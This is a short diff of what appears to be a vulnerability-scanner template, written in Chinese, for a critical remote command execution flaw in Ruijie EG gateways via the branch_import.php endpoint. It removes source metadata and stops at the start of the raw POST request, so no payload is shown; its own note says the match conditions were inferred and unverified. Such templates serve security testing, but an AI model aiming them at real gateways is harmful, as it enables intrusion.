@@ -3,13 +3,8 @@ info:
   name: 锐捷EG易网关branch_import存在后台远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d8ed71dd4b2d19eb6b37ee12c6de1180
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: d8ed71dd4b2d19eb6b37ee12c6de1180
 http:
 - raw:
   - 'POST /itbox_pi/branch_import.php?a=branch_list HTTP/1.1
